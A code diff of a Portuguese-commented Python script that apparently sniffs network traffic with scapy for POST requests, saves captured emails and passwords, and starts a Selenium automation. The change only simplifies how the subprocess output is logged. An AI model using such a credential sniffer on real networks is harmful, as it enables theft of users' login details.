@@ -1,6 +1,5 @@
 import os
 import sys
-import threading
 from scapy.all import sniff, Raw
 from urllib.parse import unquote
 import subprocess
@@ -18,23 +17,6 @@ else:
     # Caminho manual caso não esteja ativo o venv no shell atual
     python_exec = os.path.join(BASE_DIR, ".venv/bin/python")
 
-
-def monitorar_logs_selenium(proc):
-    """
-    Lê o output do Selenium e corrige as quebras de linha (efeito escada).
-    """
-    while True:
-        # Lê linha por linha do subprocesso
-        line = proc.stdout.readline()
-        if not line and proc.poll() is not None:
-            break
-
-        if line:
-            # Limpa a linha e força o carriage return (\r) + new line (\n)
-            texto_limpo = line.strip()
-            if texto_limpo:
-                sys.stdout.write(f"{texto_limpo}\r\n")
-                sys.stdout.flush()
 
 def salvar_credenciais(email, senha):
     """
@@ -91,19 +73,9 @@ def processar(pacote):
 print(f"[*] Iniciando automação Selenium com: {python_exec}")
 script_automacao = os.path.join(BASE_DIR, "selenium_automation.py")
 
-# 1. Usamos PIPE para capturar stdout e stderr
-# 2. text=True faz com que venha como string, não bytes
-proc = subprocess.Popen(
-    [python_exec, script_automacao],
-    stdout=subprocess.PIPE,
-    stderr=subprocess.STDOUT,
-    text=True,
-    bufsize=1  # Line buffered
-)
-
-# Inicia thread para corrigir e mostrar os logs em tempo real
-t = threading.Thread(target=monitorar_logs_selenium, args=(proc,), daemon=True)
-t.start()
+# Popen sem pipes para que o Selenium possa usar o stdout se necessário,
+# ou use pipes se quiser silenciar.
+proc = subprocess.Popen([python_exec, script_automacao])
 
 print("[*] Sniffer ativo. Aguardando POSTs...")
 try:
